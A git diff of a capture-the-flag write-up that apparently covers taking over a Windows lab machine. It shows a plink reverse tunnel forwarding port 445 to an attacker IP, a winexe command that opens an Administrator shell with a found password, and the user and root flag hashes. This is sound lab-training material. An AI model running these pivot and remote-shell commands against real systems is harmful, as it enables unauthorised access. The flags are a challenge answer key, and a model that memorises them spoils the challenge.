@@ -74,14 +74,14 @@ plink.exe -l root -pw toor -R 445:127.0.0.1:445 10.10.14.34
 ![](https://lh3.googleusercontent.com/3hgewaHdfTeTGCjqWaAFIJpoNsUznouWC1xlwtoIgnhF6HpRn22Z0FbnrDC8mXzVf9_5xwQe3rJi16uK83JauxdvQ3hvMnNz83WR-ff7CiC29tmWxPIElI6e47v80VrQD04tjeaLPel2qJEfv3qwDMAwzXYz99LO8PYoloRu2zuf1GiE-yTbBG4QIWhzr7WXpCOs7_kgYueM46LQhoxZinHBrhe6sVxhFpra-49dHolelEogpxFSEj0Nf1m5xeE_toUHaY9cDYwmdPm8bjZ8_gOd1PlsChrRNMj0QFQ-YyXvAN5kWocC7zQ86p42jrFxRQlhbIEoQQGBMun81Zfd9nUh6pmYuVJ1Yu6jtvaOm0bAjN7sG_ziN964v9_0DPjaFlpNbsB03AM3pSxpzUwIQXQVLQ61WuRYTNF1039tiKnfG6AeXCP5TuQqS5z-BpVQ29hyD44B_KR8MChHtQRHy2tpuxjEAdxpZa-HoFHmTjau7TSuEDe0FGynjcLVuUgcnTMCkJnF2BXme1LENos41q_CFiJCBswLoe3V5Y84VUUkNWd4-H0GfWW5Z4D50pMW3wPVYd3JaHmNI2aPydPlkoUT1Vjna9RETPovCkd-2DAxu4Q6ItEDFl4qkEG7tBX3SYbZ_vwcsb3oOZC4cCvo5V3LBewHKcbC6myd9b-77gUIwK-vF2W8EC8=w671-h377-no)
 
 3. We check with netstat to make sure the port 445 is open and connecte to us
-4. The we connect reverse using **winexe** and password **"Welcome1!** and we get Admin.
+4. The we connect reverse using `winexe` and password `Welcome1!` and we get Admin.
 ```shell
-winexe -U Administrator //127.0.0.1 "cmd.exe
+winexe -U Administrator //127.0.0.1 "cmd.exe"
 ```
 ![](https://lh3.googleusercontent.com/qJ_iqW9ZDj5NmYHAZhf9jIyp64xLkOF40n8BlPayOvlhVlO6ES1Ud4QqmtpzKuR_jeKSZFcUhGcM5wHNsX089y1-UEH-czLi5PQDnrWRpHcLiRC4HN0a1t_gH6w84RyS2AlIS_vb1ocXjiOV04l-fyvKXqjzqXO0dx2fEG5Siq8hQrJTKsXsDt3yGy_gvGbjLC25SQq97tleHu8n4SCnv2Cjc6DD_6KwehKy7RrJw601snGgZs1Lyx3dpGCcYkOqq2agv-ByaJqWdbhu8cWlzmKQIj-TpuYuFSknz0G0NAjmb0f3IN-ozXv7dP284IcPrDprQFC88QeD_PHfaowY7KERozetcjAFuo1zvQXVDf4Ke20SNOF8lUH8HxjFJxR3uWM8tDu5z9PeTSwvX7NDl2QewQvC1iWSBpNhYotcvim9J4AekXJfTRoUJ1kzaKhbWc7l52ycI8xMUEL9cO0MTMRWN99oD-4KYzZuuGliQT96SpupGQh6PBo9NHgiESB60RbgoAC0bBYDmNkiFzz8VfnDTisQUcXlNpxhvp292s0gjKAhlB04IKC2kKdzPetPbnp51hdsYQ9bFMXerg5vguBK7hew6k6bgzewhoQ5otrBQdVh68vowY2lKnV3aDVD_YnWwP0K2gjFDVUmMUj4rmf95niOwpzc6AGgxgihyn64Q88xaoL6Hq8=w698-h203-no)
 
 # FLAGS
 ```shell
-USER  "72290246dfaedb1e3e3ac9d6fb306334"
-ROOT  "a673d1b1fa95c276c5ef2aa13d9dcc7c" 
+USER:72290246dfaedb1e3e3ac9d6fb306334
+ROOT:a673d1b1fa95c276c5ef2aa13d9dcc7c 
 ```
